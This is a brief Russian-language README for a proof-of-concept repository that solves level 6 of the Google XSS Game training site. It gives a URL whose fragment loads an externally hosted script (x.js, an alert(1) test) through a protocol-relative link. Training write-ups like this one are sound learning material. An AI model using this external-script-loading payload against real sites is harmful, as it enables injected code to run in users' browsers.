# XSS Game — Proof of Concept (Level 6)

Репозиторий создан для демонстрации эксплуатации уязвимости **DOM-based XSS** (загрузка внешнего скрипта через protocol-relative URL `//`) при прохождении 6-го уровня тренажёра [Google XSS Game](https://xss-game.appspot.com/).

## Содержимое
* `x.js` — тестовый payload (`alert(1)`), используемый для проверки выполнения стороннего JavaScript-кода.

## Пример использования
```text
https://xss-game.appspot.com/level6/frame#//xeone52670v3.github.io/xss-test/x.js
